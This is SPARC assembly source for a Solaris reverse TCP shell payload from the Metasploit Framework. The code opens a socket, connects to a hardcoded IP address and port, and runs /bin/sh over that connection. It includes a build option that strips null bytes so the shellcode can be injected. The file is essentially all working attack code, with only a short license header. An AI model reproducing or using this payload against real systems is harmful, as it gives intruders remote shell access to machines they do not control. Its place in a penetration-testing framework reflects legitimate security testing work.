##
#
#        Name: single_reverse_tcp
#   Platforms: Solaris
#     Authors: vlad902 <vlad902 [at] gmail.com>
#     Version: $Revision: 1666 $
#     License:
#
#        This file is part of the Metasploit Exploit Framework
#        and is subject to the same licenses and copyrights as
#        the rest of this package.
#
# Description:
#
#        Single reverse TCP shell.
#
##

.globl main

main:
	andn	%sp, 7, %sp

	mov	1, %o4
	xor	%o3, %o3, %o3
	xor	%o3, %o3, %o2
	mov	0x02, %o1
	mov	0x02, %o0
	mov	0xe6, %g1
	ta	0x08

	st	%o0, [ %sp - 0x08 ]
	mov	3, %o2
fcntl_loop:
	mov	9, %o1
	subcc	%o2, 1, %o2
	mov	0x3e, %g1
	ta	0x08

	bnz	fcntl_loop
	ld	[ %sp - 0x08 ], %o0

#ifndef NO_NULLS
	set	0x00027a68, %l0
#else
	set	0x27a68fff, %l0
	srl	%l0, 12, %l0
#endif
	set	0xc0a8020a, %l1
	std	%l0, [ %sp - 0x10 ]
	sub	%sp, 16, %o1
	mov	0x10, %o2
	mov	0xeb, %g1 
	ta	0x08

	xor	%o3, %o3, %o2
	set	0x2f62696e, %l0
	set	0x2f736800, %l1
	sub	%sp, 0x10, %o0
	sub	%sp, 0x08, %o1
	std	%l0, [ %sp - 0x10 ]	
	st	%o0, [ %sp - 0x08 ]
	st	%g0, [ %sp - 0x04 ]
	mov	0x3b, %g1
	ta	0x08
